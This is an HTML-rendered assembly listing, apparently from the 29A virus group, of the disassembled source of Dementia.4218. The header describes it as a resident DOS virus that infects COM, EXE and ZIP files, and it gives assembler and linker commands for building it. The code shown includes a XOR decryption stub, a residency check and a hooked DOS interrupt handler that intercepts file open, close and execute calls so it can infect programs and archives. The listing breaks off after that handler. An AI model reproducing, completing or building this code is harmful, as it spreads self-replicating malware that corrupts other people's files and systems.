<!DOCTYPE html PUBLIC "-//W3C//DTD HTML 4.01//EN" "http://www.w3.org/TR/1999/REC-html401-19991224/strict.dtd">
<html>
<head>
<META http-equiv=Content-Type content="text/html; charset=windows-1252">
<title>dementi_.asm</title>
<style type="text/css">
span {
	font-family: 'Courier New';
	font-size: 10pt;
	color: #000000;
}
.sc0 {
}
.sc1 {
	color: #008000;
}
.sc2 {
	color: #FF8000;
}
.sc4 {
	font-weight: bold;
	color: #000080;
}
.sc5 {
}
.sc6 {
	font-weight: bold;
	color: #0000FF;
}
.sc8 {
	font-weight: bold;
	color: #8080FF;
}
.sc9 {
	color: #0080FF;
}
.sc10 {
	font-weight: bold;
	color: #000080;
}
.sc12 {
	color: #808000;
}
.sc13 {
	color: #808080;
}
</style>
</head>
<body>
<div style="float: left; white-space: pre; line-height: 1; background: #FFFFFF; "><span class="sc1">; comment *</span><span class="sc0">
</span><span class="sc1">;                Dementia.4218</span><span class="sc0">
</span><span class="sc1">;                Disassembly by</span><span class="sc0">
</span><span class="sc1">;                 Darkman/29A</span><span class="sc0">
</span><span class="sc1">; </span><span class="sc0">
</span><span class="sc1">;   Dementia.4218 is a 4218 bytes parasitic resident COM/EXE/ZIP virus. Infects</span><span class="sc0">
</span><span class="sc1">;   files at close file, open file and load and/or execute program by appending</span><span class="sc0">
</span><span class="sc1">;   the virus to the infected COM/EXE file and storing in the infected ZIP file.</span><span class="sc0">
</span><span class="sc1">;   Dementia.4218 has an error handler, 16-bit exclusive OR (XOR) encryption in</span><span class="sc0">
</span><span class="sc1">;   file and is using archive infection technique.</span><span class="sc0">
</span><span class="sc1">; </span><span class="sc0">
</span><span class="sc1">;   To compile Dementia.4218 with Turbo Assembler v 4.0 type:</span><span class="sc0">
</span><span class="sc1">;     TASM /M DEMENTI_.ASM</span><span class="sc0">
</span><span class="sc1">;     TLINK /x DEMENTI_.OBJ</span><span class="sc0">
</span><span class="sc1">;     EXE2BIN DEMENTI_.EXE DEMENTI_.COM</span><span class="sc0">
</span><span class="sc1">; *</span><span class="sc0">

</span><span class="sc9">.model</span><span class="sc0"> </span><span class="sc10">tiny</span><span class="sc0">
</span><span class="sc9">.code</span><span class="sc0">

</span><span class="sc5">code_begin</span><span class="sc4">:</span><span class="sc0">
         </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">delta_offset</span><span class="sc0">
</span><span class="sc5">delta_offset</span><span class="sc4">:</span><span class="sc0">
         </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">si</span><span class="sc0">          </span><span class="sc1">; Load SI from stack</span><span class="sc0">
         </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">si</span><span class="sc4">,(</span><span class="sc5">crypt_begin</span><span class="sc4">-</span><span class="sc5">delta_offset</span><span class="sc4">-</span><span class="sc2">02h</span><span class="sc4">)</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc8">si</span><span class="sc0">       </span><span class="sc1">; DI = offset of code_end - 02h</span><span class="sc0">

         </span><span class="sc6">std</span><span class="sc0">             </span><span class="sc1">; Set direction flag</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,(</span><span class="sc5">crypt_begin</span><span class="sc4">-</span><span class="sc5">crypt_end</span><span class="sc4">-</span><span class="sc2">02h</span><span class="sc4">)/</span><span class="sc2">02h</span><span class="sc0">
</span><span class="sc5">decrypt_key</span><span class="sc0">  </span><span class="sc9">equ</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc10">$</span><span class="sc4">+</span><span class="sc2">01h</span><span class="sc0">  </span><span class="sc1">; Decryption key</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc2">00h</span><span class="sc0">      </span><span class="sc1">; DX = decryption key</span><span class="sc0">

         </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">cs</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc0">       </span><span class="sc1">; Save segments at stack</span><span class="sc0">
         </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ds</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc0">       </span><span class="sc1">; Load segments from stack (CS)</span><span class="sc0">
</span><span class="sc5">decrypt_loop</span><span class="sc4">:</span><span class="sc0">
         </span><span class="sc6">lodsw</span><span class="sc0">           </span><span class="sc1">; AX = word of encrypted code</span><span class="sc0">
         </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">dx</span><span class="sc0">       </span><span class="sc1">; Decrypt two bytes</span><span class="sc0">
         </span><span class="sc6">stosw</span><span class="sc0">           </span><span class="sc1">; Store two plain bytes</span><span class="sc0">

         </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">crypt_end</span><span class="sc0">

         </span><span class="sc6">nop</span><span class="sc0">
</span><span class="sc5">crypt_end</span><span class="sc4">:</span><span class="sc0">
         </span><span class="sc6">loop</span><span class="sc0">    </span><span class="sc5">decrypt_loop</span><span class="sc0">

         </span><span class="sc6">cld</span><span class="sc0">             </span><span class="sc1">; Clear direction flag</span><span class="sc0">
         </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">cs</span><span class="sc0">          </span><span class="sc1">; Save CS at stack</span><span class="sc0">
         </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc8">si</span><span class="sc4">,(</span><span class="sc5">crypt_end</span><span class="sc4">-</span><span class="sc5">code_begin</span><span class="sc4">)</span><span class="sc0">
         </span><span class="sc6">nop</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cl</span><span class="sc4">,</span><span class="sc2">04h</span><span class="sc0">      </span><span class="sc1">; Divide by paragraphs</span><span class="sc0">
         </span><span class="sc6">shr</span><span class="sc0">     </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc8">cl</span><span class="sc0">       </span><span class="sc1">; SI = offset of crypt_end in para...</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">cs</span><span class="sc0">       </span><span class="sc1">; AX = code segment</span><span class="sc0">
         </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">si</span><span class="sc0">       </span><span class="sc1">; Add code segment to delta offset...</span><span class="sc0">
         </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ax</span><span class="sc0">          </span><span class="sc1">; Save AX at stack</span><span class="sc0">

         </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc5">virus_begin</span><span class="sc0">  </span><span class="sc1">; AX = offset of virus_begin</span><span class="sc0">
         </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ax</span><span class="sc0">          </span><span class="sc1">; Save AX at stack</span><span class="sc0">

         </span><span class="sc6">retf</span><span class="sc0">            </span><span class="sc1">; Return far!</span><span class="sc0">
</span><span class="sc5">virus_begin</span><span class="sc4">:</span><span class="sc0">
         </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">cs</span><span class="sc0">          </span><span class="sc1">; Save CS at stack</span><span class="sc0">
         </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ds</span><span class="sc0">          </span><span class="sc1">; Load DS from stack (CS)</span><span class="sc0">

         </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc0">          </span><span class="sc1">; Load AX from stack (CS)</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc5">code_seg_</span><span class="sc4">],</span><span class="sc8">ax</span><span class="sc0">  </span><span class="sc1">; Store code segment</span><span class="sc0">

         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc2">1492h</span><span class="sc0">        </span><span class="sc1">; Dementia.4218 function</span><span class="sc0">
         </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">close_file</span><span class="sc0">
         </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc2">1776h</span><span class="sc0">        </span><span class="sc1">; Already resident?</span><span class="sc0">
         </span><span class="sc6">je</span><span class="sc0">      </span><span class="sc5">virus_exit</span><span class="sc0">      </span><span class="sc1">; Equal? Jump to virus_exit</span><span class="sc0">

         </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">install</span><span class="sc0">
</span><span class="sc5">virus_exit</span><span class="sc4">:</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,[</span><span class="sc5">com_or_exe</span><span class="sc4">]</span><span class="sc0">     </span><span class="sc1">; AH = COM or EXE executable?</span><span class="sc0">
         </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">00h</span><span class="sc0">      </span><span class="sc1">; COM executable?</span><span class="sc0">
         </span><span class="sc6">nop</span><span class="sc0">
         </span><span class="sc6">je</span><span class="sc0">      </span><span class="sc5">vir_com_exit</span><span class="sc0">    </span><span class="sc1">; Equal? Jump to vir_com_exit</span><span class="sc0">

         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,[</span><span class="sc5">code_seg_</span><span class="sc4">]</span><span class="sc0">  </span><span class="sc1">; AX = code segment</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">bx</span><span class="sc4">,[</span><span class="sc5">initial_cs</span><span class="sc4">]</span><span class="sc0">     </span><span class="sc1">; AX = initial CS relative to star...</span><span class="sc0">
         </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">bx</span><span class="sc0">       </span><span class="sc1">; Subtract initial CS relative to ...</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">       </span><span class="sc1">; DX = segment of PSP for current ...</span><span class="sc0">

         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">bx</span><span class="sc4">,[</span><span class="sc5">code_seg</span><span class="sc4">]</span><span class="sc0">   </span><span class="sc1">; BX = original code segment</span><span class="sc0">
         </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">bx</span><span class="sc0">       </span><span class="sc1">; Add original code segment to seg...</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc5">code_seg</span><span class="sc4">],</span><span class="sc8">ax</span><span class="sc0">   </span><span class="sc1">; Store original code segment</span><span class="sc0">

         </span><span class="sc6">xchg</span><span class="sc0">    </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">dx</span><span class="sc0">       </span><span class="sc1">; AX = segment of current PSP proc...</span><span class="sc0">

         </span><span class="sc6">cli</span><span class="sc0">             </span><span class="sc1">; Clear interrupt-enable flag</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">bx</span><span class="sc4">,[</span><span class="sc5">stack_seg</span><span class="sc4">]</span><span class="sc0">  </span><span class="sc1">; BX = original stack segment</span><span class="sc0">
         </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">bx</span><span class="sc0">       </span><span class="sc1">; Add original stack segment to se...</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ss</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">       </span><span class="sc1">; SS = original stack segment</span><span class="sc0">

         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,[</span><span class="sc5">stack_ptr</span><span class="sc4">]</span><span class="sc0">  </span><span class="sc1">; AX = original stack pointer</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">sp</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">       </span><span class="sc1">; SP =    "       "      "</span><span class="sc0">
         </span><span class="sc6">sti</span><span class="sc0">             </span><span class="sc1">; Set interrupt-enable flag</span><span class="sc0">

         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">62h</span><span class="sc0">      </span><span class="sc1">; Get current PSP address</span><span class="sc0">
         </span><span class="sc6">int</span><span class="sc0">     </span><span class="sc2">21h</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ds</span><span class="sc4">,</span><span class="sc8">bx</span><span class="sc0">       </span><span class="sc1">; DS = segment of PSP for current ...</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">es</span><span class="sc4">,</span><span class="sc8">bx</span><span class="sc0">       </span><span class="sc1">; ES = segment of PSP for current ...</span><span class="sc0">

         </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">       </span><span class="sc1">; Zero AX</span><span class="sc0">
         </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc8">bx</span><span class="sc0">       </span><span class="sc1">; Zero BX</span><span class="sc0">
         </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc8">cx</span><span class="sc0">       </span><span class="sc1">; Zero CX</span><span class="sc0">
         </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc8">dx</span><span class="sc0">       </span><span class="sc1">; Zero DX</span><span class="sc0">
         </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc8">si</span><span class="sc0">       </span><span class="sc1">; Zero SI</span><span class="sc0">
         </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc8">di</span><span class="sc0">       </span><span class="sc1">; Zero DI</span><span class="sc0">

         </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">instruct_ptr</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc5">vir_com_exit</span><span class="sc4">:</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc2">100h</span><span class="sc0">         </span><span class="sc1">; DI = offset of beginning of code</span><span class="sc0">
         </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc5">origin_code</span><span class="sc0">  </span><span class="sc1">; SI = offset of origin_code</span><span class="sc0">
         </span><span class="sc6">nop</span><span class="sc0">
         </span><span class="sc6">movsw</span><span class="sc0">           </span><span class="sc1">; Move the original code to beginning</span><span class="sc0">
         </span><span class="sc6">movsb</span><span class="sc0">           </span><span class="sc1">;  "    "     "      "   "      "</span><span class="sc0">

         </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">es</span><span class="sc0">          </span><span class="sc1">; Save ES at stack</span><span class="sc0">

         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">100h</span><span class="sc0">         </span><span class="sc1">; AX = offset of beginning of code</span><span class="sc0">
         </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ax</span><span class="sc0">          </span><span class="sc1">; Save AX at stack</span><span class="sc0">

         </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">       </span><span class="sc1">; Zero AX</span><span class="sc0">
         </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc8">bx</span><span class="sc0">       </span><span class="sc1">; Zero BX</span><span class="sc0">
         </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc8">cx</span><span class="sc0">       </span><span class="sc1">; Zero CX</span><span class="sc0">
         </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc8">dx</span><span class="sc0">       </span><span class="sc1">; Zero DX</span><span class="sc0">
         </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc8">si</span><span class="sc0">       </span><span class="sc1">; Zero SI</span><span class="sc0">
         </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc8">di</span><span class="sc0">       </span><span class="sc1">; Zero DI</span><span class="sc0">

         </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">es</span><span class="sc0">          </span><span class="sc1">; Save ES at stack</span><span class="sc0">
         </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ds</span><span class="sc0">          </span><span class="sc1">; Load DS from stack (ES)</span><span class="sc0">

         </span><span class="sc6">retf</span><span class="sc0">            </span><span class="sc1">; Return far!</span><span class="sc0">

</span><span class="sc5">upcase_char</span><span class="sc0">  </span><span class="sc9">proc</span><span class="sc0">    </span><span class="sc10">near</span><span class="sc0">        </span><span class="sc1">; Upcase character</span><span class="sc0">
         </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc12">'a'</span><span class="sc0">              </span><span class="sc1">; Lowcase character?</span><span class="sc0">
         </span><span class="sc6">jl</span><span class="sc0">      </span><span class="sc5">dont_upcase</span><span class="sc0">     </span><span class="sc1">; Less? Jump to dont_upcase</span><span class="sc0">
         </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc12">'z'</span><span class="sc0">              </span><span class="sc1">; Lowcase character?</span><span class="sc0">
         </span><span class="sc6">jg</span><span class="sc0">      </span><span class="sc5">dont_upcase</span><span class="sc0">     </span><span class="sc1">; Greater? Jump to dont_upcase</span><span class="sc0">

         </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">20h</span><span class="sc0">      </span><span class="sc1">; Upcase character</span><span class="sc0">
</span><span class="sc5">dont_upcase</span><span class="sc4">:</span><span class="sc0">
         </span><span class="sc6">ret</span><span class="sc0">             </span><span class="sc1">; Return!</span><span class="sc0">
         </span><span class="sc9">endp</span><span class="sc0">

</span><span class="sc5">int21_virus</span><span class="sc0">  </span><span class="sc9">proc</span><span class="sc0">    </span><span class="sc10">near</span><span class="sc0">        </span><span class="sc1">; Interrupt 21h of Dementia.4218</span><span class="sc0">
         </span><span class="sc6">pushf</span><span class="sc0">           </span><span class="sc1">; Save flags at stack</span><span class="sc0">
         </span><span class="sc6">cld</span><span class="sc0">             </span><span class="sc1">; Clear direction flag</span><span class="sc0">

         </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">3eh</span><span class="sc0">      </span><span class="sc1">; Close file?</span><span class="sc0">
         </span><span class="sc6">jne</span><span class="sc0">     </span><span class="sc5">tst_open_fil</span><span class="sc0">    </span><span class="sc1">; Not equal? Jump to tst_open_fil</span><span class="sc0">

         </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc2">1492h</span><span class="sc0">        </span><span class="sc1">; Dementia.4218 function?</span><span class="sc0">
         </span><span class="sc6">jne</span><span class="sc0">     </span><span class="sc5">tst_open_fil</span><span class="sc0">    </span><span class="sc1">; Not equal? Jump to tst_open_fil</span><span class="sc0">

         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc2">1776h</span><span class="sc0">        </span><span class="sc1">; Already resident</span><span class="sc0">

         </span><span class="sc6">popf</span><span class="sc0">            </span><span class="sc1">; Load flags from stack</span><span class="sc0">

         </span><span class="sc6">iret</span><span class="sc0">            </span><span class="sc1">; Interrupt return!</span><span class="sc0">
</span><span class="sc5">tst_open_fil</span><span class="sc4">:</span><span class="sc0">
         </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">3dh</span><span class="sc0">      </span><span class="sc1">; Open file</span><span class="sc0">
         </span><span class="sc6">jne</span><span class="sc0">     </span><span class="sc5">tst_load_and</span><span class="sc0">    </span><span class="sc1">; Not equal? Jump to tst_load_and</span><span class="sc0">

         </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">0ffh</span><span class="sc0">         </span><span class="sc1">; Dementia.4218 function</span><span class="sc0">
         </span><span class="sc6">je</span><span class="sc0">      </span><span class="sc5">dementia_fun</span><span class="sc0">    </span><span class="sc1">; Equal? Jump to dementia_fun</span><span class="sc0">

         </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ax</span><span class="sc0"> </span><span class="sc8">si</span><span class="sc0">       </span><span class="sc1">; Save registers at stack</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc8">dx</span><span class="sc0">       </span><span class="sc1">; SI = offset of filename</span><span class="sc0">
</span><span class="sc5">find_dot</span><span class="sc4">:</span><span class="sc0">
         </span><span class="sc6">lodsb</span><span class="sc0">           </span><span class="sc1">; AL = byte of filename</span><span class="sc0">
         </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">00h</span><span class="sc0">      </span><span class="sc1">; End of filename?</span><span class="sc0">
         </span><span class="sc6">je</span><span class="sc0">      </span><span class="sc5">open_fi_exit</span><span class="sc0">    </span><span class="sc1">; Equal? Jump to open_fi_exit</span><span class="sc0">

         </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc12">'.'</span><span class="sc0">              </span><span class="sc1">; Found the dot in the filename</span><span class="sc0">
         </span><span class="sc6">jne</span><span class="sc0">     </span><span class="sc5">find_dot</span><span class="sc0">        </span><span class="sc1">; Not equal? Jump to find_dot</span><span class="sc0">

         </span><span class="sc6">lodsb</span><span class="sc0">           </span><span class="sc1">; AL = byte of extension</span><span class="sc0">
         </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">upcase_char</span><span class="sc0">
         </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc12">'C'</span><span class="sc0">              </span><span class="sc1">; COM executable?</span><span class="sc0">
         </span><span class="sc6">jne</span><span class="sc0">     </span><span class="sc5">tst_exe_exec</span><span class="sc0">    </span><span class="sc1">; Not equal? Jump to tst_exe_exec</span><span class="sc0">

         </span><span class="sc6">lodsb</span><span class="sc0">           </span><span class="sc1">; AL = byte of extension</span><span class="sc0">
         </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">upcase_char</span><span class="sc0">
         </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc12">'O'</span><span class="sc0">              </span><span class="sc1">; COM executable?</span><span class="sc0">
         </span><span class="sc6">jne</span><span class="sc0">     </span><span class="sc5">open_fi_exit</span><span class="sc0">    </span><span class="sc1">; Not equal? Jump to open_fi_exit</span><span class="sc0">

         </span><span class="sc6">lodsb</span><span class="sc0">           </span><span class="sc1">; AL = byte of extension</span><span class="sc0">
         </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">upcase_char</span><span class="sc0">
         </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc12">'M'</span><span class="sc0">              </span><span class="sc1">; COM executable?</span><span class="sc0">
         </span><span class="sc6">jne</span><span class="sc0">     </span><span class="sc5">open_fi_exit</span><span class="sc0">    </span><span class="sc1">; Not equal? Jump to open_fi_exit</span><span class="sc0">

         </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">inf_com_exe</span><span class="sc0">

         </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">open_fi_exit</span><span class="sc0">

         </span><span class="sc6">nop</span><span class="sc0">
</span><span class="sc5">tst_exe_exec</span><span class="sc4">:</span><span class="sc0">
         </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc12">'E'</span><span class="sc0">              </span><span class="sc1">; EXE executable?</span><span class="sc0">
         </span><span class="sc6">jne</span><span class="sc0">     </span><span class="sc5">tst_zip_arch</span><span class="sc0">    </span><span class="sc1">; Not equal? Jump to tst_zip_arch</span><span class="sc0">

         </span><span class="sc6">lodsb</span><span class="sc0">           </span><span class="sc1">; AL = byte of extension</span><span class="sc0">
         </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">upcase_char</span><span class="sc0">
         </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc12">'X'</span><span class="sc0">              </span><span class="sc1">; EXE executable?</span><span class="sc0">
         </span><span class="sc6">jne</span><span class="sc0">     </span><span class="sc5">open_fi_exit</span><span class="sc0">    </span><span class="sc1">; Not equal? Jump to open_fi_exit</span><span class="sc0">

         </span><span class="sc6">lodsb</span><span class="sc0">           </span><span class="sc1">; AL = byte of extension</span><span class="sc0">
         </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">upcase_char</span><span class="sc0">
         </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc12">'E'</span><span class="sc0">              </span><span class="sc1">; EXE executable?</span><span class="sc0">
         </span><span class="sc6">jne</span><span class="sc0">     </span><span class="sc5">open_fi_exit</span><span class="sc0">    </span><span class="sc1">; Not equal? Jump to open_fi_exit</span><span class="sc0">

         </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">inf_com_exe</span><span class="sc0">

         </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">open_fi_exit</span><span class="sc0">

         </span><span class="sc6">nop</span><span class="sc0">
</span><span class="sc5">tst_zip_arch</span><span class="sc4">:</span><span class="sc0">
         </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc12">'Z'</span><span class="sc0">              </span><span class="sc1">; ZIP archive?</span><span class="sc0">
         </span><span class="sc6">jne</span><span class="sc0">     </span><span class="sc5">open_fi_exit</span><span class="sc0">    </span><span class="sc1">; Not equal? Jump to open_fi_exit</span><span class="sc0">

         </span><span class="sc6">lodsb</span><span class="sc0">           </span><span class="sc1">; AL = byte of extension</span><span class="sc0">
         </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">upcase_char</span><span class="sc0">
         </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc12">'I'</span><span class="sc0">              </span><span class="sc1">; ZIP archive?</span><span class="sc0">
         </span><span class="sc6">jne</span><span class="sc0">     </span><span class="sc5">open_fi_exit</span><span class="sc0">    </span><span class="sc1">; Not equal? Jump to open_fi_exit</span><span class="sc0">

         </span><span class="sc6">lodsb</span><span class="sc0">           </span><span class="sc1">; AL = byte of extension</span><span class="sc0">
         </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">upcase_char</span><span class="sc0">
         </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc12">'P'</span><span class="sc0">              </span><span class="sc1">; ZIP archive?</span><span class="sc0">
         </span><span class="sc6">jne</span><span class="sc0">     </span><span class="sc5">open_fi_exit</span><span class="sc0">    </span><span class="sc1">; Not equal? Jump to open_fi_exit</span><span class="sc0">

         </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">infect_zip</span><span class="sc0">

         </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">open_fi_exit</span><span class="sc0">

         </span><span class="sc6">nop</span><span class="sc0">
</span><span class="sc5">open_fi_exit</span><span class="sc4">:</span><span class="sc0">
         </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">si</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">       </span><span class="sc1">; Load registers from stack</span><span class="sc0">

         </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">tst_load_and</span><span class="sc0">

         </span><span class="sc6">nop</span><span class="sc0">
</span><span class="sc5">dementia_fun</span><span class="sc4">:</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">02h</span><span class="sc0">      </span><span class="sc1">; Dementia.4218 function</span><span class="sc0">
</span><span class="sc5">tst_load_and</span><span class="sc4">:</span><span class="sc0">
         </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">4bh</span><span class="sc0">      </span><span class="sc1">; Load and/or execute program?</span><span class="sc0">
         </span><span class="sc6">jne</span><span class="sc0">     </span><span class="sc5">int21_exit</span><span class="sc0">      </span><span class="sc1">; Not equal? Jump to int21_exit</span><span class="sc0">

         </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">inf_com_exe</span><span class="sc0">
</span><span class="sc5">int21_exit</span><span class="sc4">:</span><span class="sc0">
         </span><span class="sc6">popf</span><span class="sc0">            </span><span class="sc1">; Load flags from stack</span><span class="sc0">

         </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">int21_addr</span><span class="sc4">]</span><span class="sc0">
